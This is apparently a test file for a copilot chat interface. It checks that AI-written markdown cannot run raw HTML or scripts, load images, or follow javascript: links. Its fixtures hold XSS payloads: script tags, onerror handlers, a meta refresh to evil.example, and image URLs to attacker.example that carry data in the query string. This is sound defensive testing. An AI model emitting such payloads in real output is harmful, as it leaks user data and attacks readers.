import { render, screen } from "@testing-library/react";
import Markdown from "markdown-to-jsx";
import { beforeEach, describe, expect, it, type Mock, vi } from "vitest";
import Artifact from "~/components/AI/Artifact";
import CopilotAIMessage from "~/components/AI/CopilotAIMessage";
import { useShallowStreamingStore } from "~/components/AI/hooks/useStreaming";
import {
  CodeMarkdownOptions,
  InertMarkdownOptions,
  MarkdownAIMessageOptions,
  MarkdownAIMessageOverrides,
  PreCodeComponent,
  renderRule,
} from "~/components/AI/MarkdownOverrides";
import type { AIMessage, ArtifactT, Citation } from "~/lib/state/copilot";
import { useShallowCopilotStore } from "~/lib/state/copilot";

vi.mock("sonner", () => ({
  toast: {
    success: vi.fn(),
    error: vi.fn(),
  },
}));

vi.mock("usehooks-ts", () => ({
  useLocalStorage: vi.fn(<T,>(_key: string, defaultValue: T) => [
    defaultValue,
    vi.fn(),
  ]),
  useDebounceValue: <T,>(value: T) => [value],
}));

vi.mock("~/lib/state/copilot", () => ({
  useShallowCopilotStore: vi.fn(),
}));

vi.mock("~/components/AI/hooks/useStreaming", () => ({
  useShallowStreamingStore: vi.fn(),
}));

vi.mock("~/components/AI/hooks/utils", () => ({
  dispatchCreate: vi.fn(),
}));

vi.mock("~/components/AI/utils/datetimePositioning", () => ({
  getEnhancedDatetimePositionStrategy: vi.fn(() => ({
    shouldShowDatetime: false,
    timestamp: 0,
    targetGroupId: "",
  })),
}));

vi.mock("~/components/AI/Citation", () => ({
  default: ({ index, content: _content }: { index: number; content: Citation }) => (
    <span data-testid={`citation-${index}`}>[{index + 1}]</span>
  ),
}));

vi.mock("~/components/AI/CopilotFeedback", () => ({
  CopilotFeedback: ({ message: _message }: { message: AIMessage }) => (
    <div data-testid="feedback-component" />
  ),
}));

describe("Copilot markdown security", () => {
  const getCurrentChatArtifact = vi.fn();

  beforeEach(() => {
    vi.clearAllMocks();
    (useShallowStreamingStore as Mock).mockImplementation((selector) =>
      selector({ streamingStatus: "idle" }),
    );
    (useShallowCopilotStore as Mock).mockImplementation((selector) =>
      selector({
        showDatetime: vi.fn(),
        hideDatetime: vi.fn(),
        getCurrentChatArtifact,
        hoveredCitationWidgetId: null,
      }),
    );
  });

  function renderAiMessage(message: Partial<AIMessage>) {
    return render(
      <CopilotAIMessage
        message={{
          role: "ai",
          content: "",
          copilotId: "default-copilot",
          timestamp: 1705330200000,
          citations: [],
          ...message,
        }}
      />,
    );
  }

  it("renders only the frontend-owned self-closing citation marker", () => {
    renderAiMessage({
      content:
        'Good <citation className="live-citation"/> bad <citation:dead-citation>',
      citations: [
        {
          id: "live-citation",
          source_info: { type: "widget", name: "Live Citation" },
          signature: "live-signature",
        },
        {
          id: "dead-citation",
          source_info: { type: "widget", name: "Dead Citation" },
          signature: "dead-signature",
        },
      ],
    });

    expect(screen.getByTestId("citation-0")).toBeInTheDocument();
    expect(screen.queryByTestId("citation-1")).not.toBeInTheDocument();
  });

  it("renders underscore-bearing artifact markers as artifacts", () => {
    getCurrentChatArtifact.mockImplementation((artifactId: string) => {
      if (artifactId !== "html_ff467074") return undefined;
      return {
        type: "html",
        uuid: "artifact-html-1",
        name: "html_ff467074",
        content: "<html><body><h1>Report</h1></body></html>",
        description: "HTML report",
      } satisfies ArtifactT;
    });

    const { container } = renderAiMessage({
      content: 'Created <artifact className="html_ff467074" />',
    });

    expect(
      screen.queryByText(/<artifact className="html_ff467074"/),
    ).not.toBeInTheDocument();
    expect(
      container.querySelector('iframe[title="html_ff467074"]'),
    ).toBeInTheDocument();
  });

  it("keeps ordinary raw HTML inert in AI messages", () => {
    const { container } = renderAiMessage({
      content:
        '<meta http-equiv="refresh" content="0;url=https://evil.example"><input value="spoof"><script>alert(1)</script>',
    });

    expect(container.querySelector("meta")).not.toBeInTheDocument();
    expect(container.querySelector("input")).not.toBeInTheDocument();
    expect(container.querySelector("script")).not.toBeInTheDocument();
    expect(screen.getByText(/<meta http-equiv="refresh"/)).toBeInTheDocument();
  });

  it("does not render an image of any kind in AI messages: the alt text is what is shown, and nothing is requested", () => {
    const { container } = renderAiMessage({
      content: [
        'Raw <img src="https://example.com/logo.png" alt="Example" onerror="alert(1)"> tag.',
        "Remote ![chart](https://attacker.example/pixel.png?d=AAPL-MSFT) image.",
        "Raster ![pixel](data:image/png;base64,aGVsbG8=) data image.",
        "SVG ![svg](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=) data image.",
        "Reference ![ref][1] image.",
        "",
        "[1]: https://attacker.example/ref.png?d=holdings",
      ].join("\n"),
    });

    expect(container.querySelector("img")).not.toBeInTheDocument();
    expect(
      container.querySelector("picture, video, audio, object, embed"),
    ).not.toBeInTheDocument();
    expect(screen.getByText(/Example/)).toBeInTheDocument();
    expect(screen.getByText(/chart/)).toBeInTheDocument();
    expect(screen.getByText(/pixel/)).toBeInTheDocument();
    // The tag is not shown as text either, and no address of an image is shown as one.
    expect(screen.queryByText(/<img/)).not.toBeInTheDocument();
    expect(container.innerHTML).not.toContain("attacker.example/pixel.png");
    expect(container.innerHTML).not.toContain("onerror");
  });

  it("does not render an image in the other markdown the chat shows", () => {
    const text =
      "A ![alt-one](https://attacker.example/one.png) and ![alt-two](data:image/png;base64,aGVsbG8=)";
    for (const options of [
      MarkdownAIMessageOptions,
      CodeMarkdownOptions,
      InertMarkdownOptions,
    ]) {
      const { container, unmount } = render(
        <Markdown options={options}>{text}</Markdown>,
      );
      expect(container.querySelector("img")).not.toBeInTheDocument();
      unmount();
    }
    const artifact: ArtifactT = {
      type: "text",
      uuid: "a-1",
      name: "a-1",
      content: text,
    };
    const { container } = render(<Artifact artifact={artifact} />);
    expect(container.querySelector("img")).not.toBeInTheDocument();
    expect(screen.getByText(/alt-one/)).toBeInTheDocument();
  });

  it("keeps the HTML of a table code block inert: it is read in a document that nothing runs or loads in", () => {
    // An element made with `innerHTML` in the page starts to load its `src` and runs `onerror` at once.
    const innerHtml = Object.getOwnPropertyDescriptor(Element.prototype, "innerHTML");
    const assigned: string[] = [];
    Object.defineProperty(Element.prototype, "innerHTML", {
      ...innerHtml,
      set(value: string) {
        assigned.push(String(value));
        innerHtml?.set?.call(this, value);
      },
    });
    try {
      const html =
        '<table><tr><th>Name</th></tr><tr><td>Apple<img src="https://attacker.example/c?d=1" onerror="window.__pwned=1"></td></tr></table>';
      const { container } = render(
        <PreCodeComponent>
          <code className="lang-html">{html}</code>
        </PreCodeComponent>,
      );
      expect(assigned.some((value) => /onerror|attacker/.test(value))).toBe(false);
      expect(container.querySelector("img")).not.toBeInTheDocument();
      expect(container.querySelector("table")).toBeInTheDocument();
      expect(screen.getByText("Name")).toBeInTheDocument();
      expect((window as unknown as { __pwned?: number }).__pwned).toBeUndefined();
    } finally {
      if (innerHtml) Object.defineProperty(Element.prototype, "innerHTML", innerHtml);
    }
  });

  it("blocks unsafe markdown links explicitly", () => {
    renderAiMessage({
      content: "[bad](javascript:alert(1)) [good](https://example.com)",
    });

    expect(screen.getByText("bad")).not.toHaveAttribute("href");
    expect(screen.getByRole("link", { name: "good" })).toHaveAttribute(
      "href",
      "https://example.com",
    );
  });

  it("does not re-enable raw HTML inside fenced markdown blocks", () => {
    const { container } = render(
      <Markdown
        options={{
          disableParsingRawHTML: true,
          renderRule,
          overrides: MarkdownAIMessageOverrides,
        }}
      >
        {
          '```markdown\n<meta http-equiv="refresh" content="0;url=https://evil.example"><input value="spoof">\n```'
        }
      </Markdown>,
    );

    expect(container.querySelector("meta")).not.toBeInTheDocument();
    expect(container.querySelector("input")).not.toBeInTheDocument();
    expect(screen.getByText(/<meta http-equiv="refresh"/)).toBeInTheDocument();
  });

  it("shows an html table code block as code, never parsing it into the page", () => {
    const { container } = renderAiMessage({
      content:
        '```html\n<table><tr><td><img src="x" onerror="window.__pwned=1"></td></tr></table>\n```',
    });

    expect(container.querySelector("table")).not.toBeInTheDocument();
    expect(container.querySelector("img")).not.toBeInTheDocument();
    // Shown as the code's text
    expect(container.querySelector("pre")?.textContent).toMatch(
      /^<table><tr><td>.*<\/td><\/tr><\/table>$/,
    );
  });

  it("keeps raw HTML inert in text artifacts", () => {
    const artifact: ArtifactT = {
      type: "text",
      uuid: "artifact-1",
      name: "artifact-1",
      content: '<input value="spoof"><script>alert(1)</script>',
    };

    const { container } = render(<Artifact artifact={artifact} />);

    expect(container.querySelector("input")).not.toBeInTheDocument();
    expect(container.querySelector("script")).not.toBeInTheDocument();
    expect(screen.getByText(/<input value="spoof"/)).toBeInTheDocument();
  });
});
